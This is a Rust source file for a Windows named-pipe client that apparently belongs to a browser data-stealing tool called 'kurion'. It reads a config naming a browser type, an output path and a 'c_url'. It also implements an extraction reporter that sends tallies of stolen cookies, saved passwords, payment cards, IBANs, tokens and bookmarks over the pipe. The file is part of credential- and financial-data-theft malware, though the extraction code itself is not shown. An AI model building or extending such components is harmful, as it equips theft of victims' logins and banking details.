use kurion_core::common::t_wide;
use windows::core::PCWSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE, GENERIC_READ, GENERIC_WRITE, INVALID_HANDLE_VALUE};
use windows::Win32::Storage::FileSystem::{CreateFileW, OPEN_EXISTING, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_MODE};
use windows::Win32::System::Pipes::WaitNamedPipeW;
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Debug)]
pub struct InitConfig {
    pub browser_type: String,
    pub output_path: String,
    pub verbose: bool,
    pub fingerprint: bool,
    pub c_url: String,
}

pub struct PipeClient {
    handle: HANDLE,
}

impl PipeClient {
    pub fn new() -> Self {
        Self {
            handle: INVALID_HANDLE_VALUE,
        }
    }

    pub fn connect(&mut self, pipe_name: &str) -> Result<(), String> {
        let pipe_name_wide = t_wide(pipe_name);

        unsafe {
            if !WaitNamedPipeW(PCWSTR(pipe_name_wide.as_ptr()), 5000).as_bool() {
            }

            let handle_res = CreateFileW(
                PCWSTR(pipe_name_wide.as_ptr()),
                GENERIC_READ.0 | GENERIC_WRITE.0,
                FILE_SHARE_MODE(0),
                None,
                OPEN_EXISTING,
                FILE_FLAGS_AND_ATTRIBUTES(0),
                None,
            );

             match handle_res {
                Ok(h) => {
                    if h == INVALID_HANDLE_VALUE {
                        return Err("Invalid handle returned".to_string());
                    }
                    self.handle = h;
                },
                Err(e) => {
                     return Err(format!("Failed to open pipe: {}", e));
                }
            }
        }

        Ok(())
    }

    pub fn send(&self, msg: &str) -> Result<(), String> {
        if self.handle == INVALID_HANDLE_VALUE {
            return Err("Pipe not connected".to_string());
        }

        let bytes = msg.as_bytes();
        let mut written = 0;
        unsafe {
            let res = windows::Win32::Storage::FileSystem::WriteFile(
                self.handle,
                Some(bytes),
                Some(&mut written),
                None
            );

            if let Err(e) = res {
                return Err(format!("WriteFile failed: {}", e));
            }
        }
        Ok(())
    }

    pub fn read(&self) -> Result<Vec<u8>, String> {
        if self.handle == INVALID_HANDLE_VALUE {
            return Err("Pipe not connected".to_string());
        }

        let mut buffer = [0u8; 4096];
        let mut bytes_read = 0;

        unsafe {
             let res = windows::Win32::Storage::FileSystem::ReadFile(
                self.handle,
                Some(&mut buffer),
                Some(&mut bytes_read),
                None
            );

             if let Err(e) = res {
                return Err(format!("Failed to read from pipe: {}", e));
            }
            if bytes_read == 0 {
                 return Err("Read 0 bytes".to_string());
            }
        }

        Ok(buffer[..bytes_read as usize].to_vec())
    }
    pub fn r_config(&self) -> Result<InitConfig, String> {
        let data = self.read()?;
        serde_json::from_slice(&data).map_err(|e| format!("Invalid config JSON: {}", e))
    }
}

impl kurion_extractor::ExtractionReporter for PipeClient {
    fn r_profile(&mut self, name: &str) {
        let _ = self.send(&format!("PROFILE:{}", name));
    }
    fn r_cookies(&mut self, count: usize, total: usize) {
        let _ = self.send(&format!("COOKIES:{}:{}", count, total));
    }
    fn r_passwords(&mut self, count: usize) {
         let _ = self.send(&format!("PASSWORDS:{}", count));
    }
    fn r_cards(&mut self, count: usize) {
        let _ = self.send(&format!("CARDS:{}", count));
    }
    fn r_ibans(&mut self, count: usize) {
        let _ = self.send(&format!("IBANS:{}", count));
    }
    fn r_tokens(&mut self, count: usize) {
        let _ = self.send(&format!("TOKENS:{}", count));
    }
    fn r_bookmarks(&mut self, count: usize) {
        let _ = self.send(&format!("BOOKMARKS:{}", count));
    }
}

impl Drop for PipeClient {
    fn drop(&mut self) {
        if self.handle != INVALID_HANDLE_VALUE {
            unsafe { let _ = CloseHandle(self.handle); }
        }
    }
}
